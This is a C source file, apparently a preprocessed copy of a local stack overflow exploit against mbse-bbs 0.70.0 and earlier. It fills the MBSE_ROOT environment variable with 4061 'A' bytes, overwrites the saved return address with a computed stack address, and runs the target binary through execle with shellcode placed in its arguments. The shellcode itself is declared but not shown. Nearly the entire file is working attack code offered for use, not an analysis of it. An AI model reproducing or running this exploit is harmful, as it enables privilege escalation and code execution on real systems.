
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int eip ;


 int execle (char*,char*,char*,char*,char*,char*,int *,char**) ;
 int exit (int ) ;
 char* malloc (int) ;
 int memcpy (char*,char*,int) ;
 int printf (char*,...) ;
 char* shellcode ;
 int strcpy (char*,char*) ;
 int strlen (char*) ;
 int strncat (char*,char*,int) ;

int main(int argc,char* argv[]) {
        int i;
        long eip = 0x41414141;
 char envh[]="MBSE_ROOT=";
 printf("[ GNU/Linux mbse-bbs 0.70.0 & below stack overflow exploit\n");
        if(argc < 2) {
                printf("Error: [path]\n");
                exit(0);
        }
        char* buffer = malloc(strlen(envh) + 4085 + sizeof(eip));
 strcpy(buffer,envh);
        long ptr = (long)buffer;
        for(i = 1;i <= 4061;i++){
                strncat(buffer,"A",1);
        }
        ptr = ptr + 4061;
        memcpy((char*)ptr,(char*)&eip,4);
        eip = 0xc0000000 -4 -strlen(argv[1]) -1 -strlen(buffer) -1 -strlen(shellcode) -1;
        memcpy((char*)ptr,(char*)&eip,4);
        char *env[] = {buffer,((void*)0)};
        printf("[ Using return address 0x%x\n",eip);
        execle(argv[1],argv[1],"x","x","x",shellcode,((void*)0),env);
        exit(0);
}
